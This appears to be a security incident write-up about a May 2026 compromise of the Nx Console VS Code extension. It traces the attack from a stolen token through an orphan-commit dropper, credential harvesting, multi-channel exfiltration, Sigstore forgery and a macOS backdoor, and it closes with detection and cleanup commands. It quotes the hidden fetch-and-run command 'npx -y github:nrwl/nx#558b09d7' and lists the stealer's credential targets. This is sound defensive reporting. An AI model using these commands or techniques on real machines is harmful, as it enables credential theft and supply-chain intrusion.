# Nx Console VS Code Extension Compromised — Orphan Commit Dropper, Sigstore Forgery & GitHub Breach

**Date:** May 2026
**Ecosystem:** VS Code Marketplace / npm / GitHub
**Severity:** Critical
**Type:** Extension Compromise / Credential Stealer / Sigstore Attestation Forgery / Persistent Backdoor
**Sources:**
- [StepSecurity — Nx Console VS Code Extension Compromised](https://www.stepsecurity.io/blog/nx-console-vs-code-extension-compromised)
- [Aikido — The Wild West of VS Code extensions and how a poisoned extension breached GitHub](https://www.aikido.dev/blog/vs-code-extension-github-breach)
- [Aikido — GitHub breached via a malicious VS Code extension: why developer devices are the real target](https://www.aikido.dev/blog/github-breached-vs-code-extension)

---

## Summary

On May 18, 2026, a compromised version of the Nx Console VS Code extension (`nrwl.angular-console` v18.95.0) was published to the Visual Studio Code Marketplace. The extension had over 2.2 million installations and was live for approximately 11 minutes (12:36–12:47 UTC) before the Nx team detected and removed it. The attack used a stolen contributor GitHub personal access token as the initial access vector.

The attack was triggered the instant a developer opened any workspace in VS Code. The injected code fetched and executed a 498 KB obfuscated payload from a dangling orphan commit (`558b09d7`) hidden inside the official `nrwl/nx` GitHub repository — a commit with no parent and not reachable from any branch. The payload was a multi-stage credential stealer targeting GitHub tokens, npm OIDC tokens, AWS/HashiCorp Vault/Kubernetes credentials, 1Password vault contents, and Claude Code configuration. It exfiltrated data over three independent channels (HTTPS, GitHub API, and DNS tunneling) and installed a persistent Python C2 backdoor on macOS.

A standout capability: the payload included full Sigstore integration — Fulcio certificate issuance and SLSA provenance generation — enabling the attacker to publish downstream npm packages with valid, cryptographically signed attestations. On May 19, 2026, GitHub publicly disclosed that approximately 3,800 internal source code repositories were exfiltrated after an employee's device was compromised by a poisoned VS Code extension. The security community widely believes the Nx Console compromise is a likely candidate, though GitHub did not confirm which extension was involved.

---

## Compromised Artifacts

| Artifact | Malicious Version | Notes |
|----------|------------------|-------|
| `nrwl.angular-console` (VS Code Marketplace) | v18.95.0 | Published 12:36 UTC, pulled 12:47 UTC (~11 min exposure) |
| `nrwl/nx` orphan commit (GitHub) | `558b09d7ad0d1660e2a0fb8a06da81a6f42e06d2` | Dangling — not on any branch |
| OpenVSX | Not affected | — |

---

## How It Worked

### Step 1: Contributor Token Theft via Prior Supply Chain Attack

A contributor's GitHub personal access token was scraped during a separate, earlier supply chain incident. The stolen token belonged to an account with push access to `nrwl/nx` and, directly or indirectly, access to the VS Code Marketplace publishing credentials (`VSCE_PAT`).

### Step 2: Orphan Commit Planted in nrwl/nx

At 03:18 UTC on May 18, the attacker used the stolen token to push an orphan commit to `nrwl/nx`. The commit (`558b09d7`) has zero parent commits and is not reachable from any branch. It is attributed to a former contributor (unsigned, unlike all of that contributor's legitimate commits) with the social-engineering commit message: "Don't delete this commit before 24 hours or wiper activates" — a fake threat designed to delay cleanup.

The commit's tree replaces the entire Nx monorepo with just a `package.json` and a 498 KB `index.js` payload. The `package.json` declares `bun` as a dependency to install the Bun runtime as a side effect, giving the payload its execution environment.

### Step 3: Malicious Extension Published to Marketplace

At 12:36 UTC, the attacker published `nrwl.angular-console` v18.95.0 with 2,777 bytes of malicious code injected into the minified `main.js`, using stolen `VSCE_PAT` credentials.

### Stage 1: Activation and Payload Fetch

The injected code runs when a developer opens any workspace. It checks VS Code's `globalState` for the key `nxConsole.mcpExtensionInstalledSha`. If not matching the hardcoded SHA, it creates a hidden VS Code Task running `npx -y github:nrwl/nx#558b09d7` — disguised as "install-mcp-extension" with `presentationOptions.focus = false` to stay hidden. `npm` fetches the orphan commit's tree, installs Bun, and executes `index.js`.

### Stage 2: Anti-Analysis Gate

The payload checks: CPU count ≥ 4 (skips sandboxes), excludes Russian/CIS time zones, and uses a lock file to prevent duplicate execution.

### Stage 3: Credential Harvesting

Six specialized collector classes run in parallel:

- **HashiCorp Vault**: Reads 8+ token paths, attempts Kubernetes and AWS IAM auth
- **npm**: Reads `.npmrc`, validates tokens, exchanges OIDC tokens via `/-/npm/v1/oidc/token/exchange/`
- **AWS**: IMDS (169.254.169.254), ECS metadata, Secrets Manager, SSM Parameter Store (SigV4-signed)
- **GitHub**: Pattern-matches `ghp_`/`gho_`/`ghs_` tokens, queries Actions secrets, scrapes runner process memory via `/proc/*/mem`
- **Filesystem**: Scans for private keys, connection strings, GCP service accounts, Docker registry auth, **Claude Code config (`~/.claude/`)**
- **1Password**: Uses `op` CLI to list vaults and retrieve secrets

On Linux, the payload also probes for passwordless `sudo` and, if successful, injects a sudoers rule for full root access.

### Stage 4: Multi-Channel Exfiltration

All data is AES-256-GCM encrypted with a random key, then the AES key is RSA-OAEP wrapped with a hardcoded attacker public key. Three independent exfil channels:

1. **HTTPS POST** to a PBKDF2-double-encrypted C2 domain on port 443
2. **GitHub API**: Creates commits/artifacts on victim's own repositories using stolen tokens
3. **DNS tunneling**: Backup channel via Node.js `dns` module

### Stage 5: Sigstore Attestation Forgery

The payload contains endpoints for `fulcio.sigstore.dev`, `rekor.sigstore.dev`, and the npm OIDC trusted-publishing flow. With stolen OIDC tokens and Sigstore certificates, the attacker could publish npm packages with valid, verifiable provenance — bypassing `npm audit signatures` entirely.

### Stage 6: Persistent Python C2 Backdoor (macOS)

Writes `~/.local/share/kitty/cat.py` and registers `~/Library/LaunchAgents/com.user.kitty-monitor.plist` (RunAtLoad=true, StartInterval=3600). Every hour, the backdoor polls `api.github.com/search/commits?q=firedalazer` for RSA-PSS-signed (4096-bit) command URLs. Only the attacker, who holds the private key, can issue commands.

---

## Timeline

| Date/Time (UTC) | Event |
|-----------------|-------|
| May 18, 03:18 | Attacker pushes orphan commit `558b09d7` to `nrwl/nx` |
| May 18, 12:36 | Malicious `nrwl.angular-console` v18.95.0 published to VS Code Marketplace |
| May 18, 12:47 | Nx team detects rogue publish, extension removed (~11 min exposure) |
| May 19 | GitHub discloses ~3,800 internal repos exfiltrated via poisoned VS Code extension |

---

## Detection

```bash
# Check installed extension version
code --list-extensions --show-versions | grep angular-console
# Affected if you see: nrwl.angular-console@18.95.0

# Check for Python C2 backdoor
ls -la ~/.local/share/kitty/cat.py

# Check for macOS LaunchAgent persistence
ls -la ~/Library/LaunchAgents/com.user.kitty-monitor.plist

# Check for anti-replay state file
ls -la /var/tmp/.gh_update_state

# Check for staging directories
ls -d /tmp/kitty-* 2>/dev/null

# Check for daemonized payload processes
ps aux | grep -E "__DAEMONIZED|kitty-|cat\.py"

# Check npm cache for orphan commit artifact
ls ~/.npm/_npx/ | grep -i nx

# Check for unauthorized sudoers entries (Linux)
sudo grep -r NOPASSWD /etc/sudoers /etc/sudoers.d/

# Check VS Code globalState for the SHA marker
# (Look for nxConsole.mcpExtensionInstalledSha = 558b09d7...)

# Monitor GitHub Search API C2 polling
# Look for outbound: api.github.com/search/commits?q=firedalazer
```

---

## Remediation

1. **Update Nx Console** to v18.100.0 or later in VS Code, Cursor, and all VS Code-based editors
2. **Kill orphaned daemon processes**:
   ```bash
   pkill -f __DAEMONIZED
   pkill -f "kitty-"
   pkill -f "cat.py"
   ```
3. **Remove persistence artifacts**:
   ```bash
   rm -f ~/.local/share/kitty/cat.py
   launchctl unload ~/Library/LaunchAgents/com.user.kitty-monitor.plist 2>/dev/null
   rm -f ~/Library/LaunchAgents/com.user.kitty-monitor.plist
   rm -rf /tmp/kitty-*
   rm -f /var/tmp/.gh_update_state
   ```
4. **Rotate all credentials** reachable from the affected machine: GitHub PATs, npm tokens, SSH keys, AWS/GCP/Azure credentials, Vault tokens, Kubernetes secrets, 1Password items accessed via CLI, Anthropic API keys (`~/.claude/`), MCP server configs
5. **Audit GitHub** for unauthorized repository creation, SSH key additions, or OAuth app authorizations
6. **Review package publish history** for npm packages you maintain — check Sigstore transparency log at `search.sigstore.dev` for unexpected attestations
7. **Rebuild the developer machine** for high-sensitivity environments rather than relying on targeted cleanup

---

## Lessons Learned

- VS Code extension auto-update is a trusted-but-unmonitored install vector; 11 minutes of marketplace exposure was enough to compromise GitHub's own internal repos
- Orphan commits in popular repositories are a stealthy payload delivery mechanism — not reachable from branches, not part of normal `git log`, yet fetchable by anyone who knows the SHA
- Fake "wiper threat" commit messages are effective social engineering to delay cleanup by discoverers
- Sigstore/SLSA provenance does not protect against attacks where the attacker holds legitimate OIDC tokens — signature validity ≠ content safety
- Memory scraping via `/proc/*/mem` bypasses log masking; any secret a process holds in memory is at risk when attacker code runs as the same user
- AI coding assistant configs (`~/.claude/`) are now an explicit target for supply chain credential theft

---

## Related Incidents

- [./2026-05-mini-shai-hulud-tanstack-npm.md](./2026-05-mini-shai-hulud-tanstack-npm.md) — Same TeamPCP orphan commit + Bun runtime pattern
- [./2026-04-checkmarx-kics-docker-vscode.md](./2026-04-checkmarx-kics-docker-vscode.md) — Previous VS Code extension compromise via orphan commit
- [./2025-08-nx-build-system.md](./2025-08-nx-build-system.md) — August 2025 Nx ecosystem attack targeting npm directly
